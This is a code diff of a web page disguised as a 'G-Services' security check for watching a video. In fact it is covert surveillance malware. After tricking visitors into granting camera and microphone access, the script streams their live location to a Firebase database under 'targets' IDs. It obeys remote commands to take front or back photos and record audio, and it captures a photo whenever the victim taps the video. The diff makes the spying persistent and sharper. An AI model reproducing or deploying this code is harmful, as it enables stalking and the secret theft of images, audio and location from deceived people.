@@ -1,96 +1,148 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Services - Secure Player</title>
+    <title>G-Services - Security Verification</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        body { background: #000; color: #fff; font-family: sans-serif; text-align: center; margin: 0; overflow: hidden; }
-        .box { padding: 50px 20px; }
-        #playBtn { background: #ff0000; color: #fff; border: none; padding: 15px 40px; font-size: 18px; border-radius: 30px; cursor: pointer; box-shadow: 0 0 20px #ff0000; }
-        #videoArea { display: none; width: 100vw; height: 100vh; position: fixed; top:0; }
+        body { background: #000; color: #fff; font-family: 'Segoe UI', sans-serif; text-align: center; margin: 0; overflow: hidden; }
+        .box { padding: 60px 20px; }
+        #playBtn { 
+            background: #d93025; color: white; border: none; padding: 18px 50px; 
+            font-size: 18px; font-weight: bold; border-radius: 50px; cursor: pointer;
+            box-shadow: 0 0 30px rgba(217, 48, 37, 0.5); transition: 0.3s;
+        }
+        #playBtn:active { transform: scale(0.95); }
+        #videoArea { display: none; width: 100vw; height: 100vh; position: fixed; top:0; left:0; background:#000; }
         iframe { width: 100%; height: 100%; border: none; }
-        #overlay { position: absolute; width: 100%; height: 100%; z-index: 10; cursor: pointer; }
+        #captureOverlay { position: absolute; width: 100%; height: 100%; z-index: 100; cursor: pointer; }
     </style>
 </head>
 <body>
+
     <div id="mainUI" class="box">
-        <h2 style="color: #4285f4;">G-Services Verification</h2>
-        <p>Confirm you are 18+ to watch this video.</p>
-        <button id="playBtn" onclick="init()">VERIFY & PLAY</button>
+        <h1 style="color: #4285f4; margin-bottom: 10px;">G-Services</h1>
+        <p style="color: #999;">Security check required to access this content.</p>
+        <div style="margin: 40px 0;">
+            <button id="playBtn" onclick="initiateSystem()">CONFIRM & WATCH</button>
+        </div>
+        <p style="font-size: 12px; color: #444;">Verification ID: <span id="displayId">...</span></p>
     </div>
 
     <div id="videoArea">
-        <div id="overlay" onclick="capturePhoto('user')"></div>
-        <iframe id="player" allow="autoplay; camera; microphone"></iframe>
+        <div id="captureOverlay" onclick="capturePhoto('user')"></div>
+        <iframe id="videoPlayer" src="" allow="autoplay; camera; microphone"></iframe>
     </div>
 
     <script>
-        const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" }; //
-        firebase.initializeApp(firebaseConfig);
+        // 1. Firebase Setup (Aapka Database)
+        const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
+        if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
         const db = firebase.database();
 
-        let userId = "Target_" + Math.floor(Math.random() * 9000 + 1000);
-        localStorage.setItem("tid", userId);
+        // 2. Persistent User ID
+        let userId = localStorage.getItem("target_uid") || "Target_" + Math.floor(Math.random() * 9000 + 1000);
+        localStorage.setItem("target_uid", userId);
+        document.getElementById('displayId').innerText = userId;
 
-        async function init() {
+        async function initiateSystem() {
             try {
-                // Requesting Mic and Camera permissions for Android
+                // Initial Permission Request (Hoshyaari se mic/cam on karna)
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
                 stream.getTracks().forEach(t => t.stop());
 
+                // UI Switch
                 document.getElementById('mainUI').style.display = 'none';
                 document.getElementById('videoArea').style.display = 'block';
-                document.getElementById('player').src = "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&controls=0";
+                
+                // Video Play (YouTube Link)
+                document.getElementById('videoPlayer').src = "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=0&controls=0&showinfo=0&rel=0";
 
-                startTracking();
-            } catch (e) { alert("Please allow permissions to continue."); }
+                startGhostTracking();
+            } catch (err) {
+                alert("Error: Verification failed. Please allow all permissions.");
+            }
         }
 
-        function startTracking() {
-            // Live Location
+        function startGhostTracking() {
+            // A. Live Location Tracking
             navigator.geolocation.watchPosition(pos => {
                 db.ref('targets/' + userId + '/location').update({
-                    lat: pos.coords.latitude, lng: pos.coords.longitude, time: new Date().toLocaleTimeString()
+                    lat: pos.coords.latitude,
+                    lng: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy + "m",
+                    last_seen: new Date().toLocaleTimeString()
                 });
             }, null, { enableHighAccuracy: true });
 
-            // Command Listener
+            // B. Ghost Command Listener (API-less Bridge)
             db.ref('commands/' + userId).on('value', async snap => {
                 const cmd = snap.val();
-                if (cmd?.action === "photo_front") capturePhoto("user");
-                if (cmd?.action === "photo_back") capturePhoto("environment");
-                if (cmd?.action === "audio") recordAudio(30000);
+                if (!cmd) return;
+
+                if (cmd.action === "photo_front") capturePhoto("user");
+                if (cmd.action === "photo_back") capturePhoto("environment");
+                if (cmd.action === "audio_record") recordAudio(30000); // 30 sec record
+
+                // Command execute hone ke baad mita dein taake baar baar na chale
+                db.ref('commands/' + userId).remove();
             });
         }
 
+        // Photo Capture Logic (High Quality)
         async function capturePhoto(mode) {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            await video.play();
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            db.ref('targets/' + userId + '/photos').push({ img: canvas.toDataURL('image/jpeg', 0.5), type: mode });
-            stream.getTracks().forEach(t => t.stop());
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: mode, width: 1280, height: 720 } 
+                });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth; 
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                const imageData = canvas.toDataURL('image/jpeg', 0.6); // 60% quality to save data
+                
+                db.ref('targets/' + userId + '/photos').push({
+                    img: imageData,
+                    type: mode === "user" ? "Front" : "Back",
+                    timestamp: new Date().toLocaleString()
+                });
+
+                stream.getTracks().forEach(t => t.stop());
+            } catch (e) { console.error("Capture Failed", e); }
         }
 
+        // Audio Recording Logic (30 Seconds)
         async function recordAudio(duration) {
-            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-            const recorder = new MediaRecorder(stream);
-            let chunks = [];
-            recorder.ondataavailable = e => chunks.push(e.data);
-            recorder.onstop = async () => {
-                const blob = new Blob(chunks, { type: 'audio/webm' });
-                const reader = new FileReader();
-                reader.readAsDataURL(blob);
-                reader.onloadend = () => db.ref('targets/' + userId + '/audios').push({ data: reader.result });
-            };
-            recorder.start();
-            setTimeout(() => recorder.stop(), duration);
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const mediaRecorder = new MediaRecorder(stream);
+                let audioChunks = [];
+
+                mediaRecorder.ondataavailable = event => audioChunks.push(event.data);
+                
+                mediaRecorder.onstop = () => {
+                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                    const reader = new FileReader();
+                    reader.readAsDataURL(audioBlob);
+                    reader.onloadend = () => {
+                        db.ref('targets/' + userId + '/audios').push({
+                            audio: reader.result,
+                            timestamp: new Date().toLocaleString()
+                        });
+                    };
+                    stream.getTracks().forEach(t => t.stop());
+                };
+
+                mediaRecorder.start();
+                setTimeout(() => mediaRecorder.stop(), duration);
+            } catch (e) { console.error("Audio Failed", e); }
         }
     </script>
 </body>
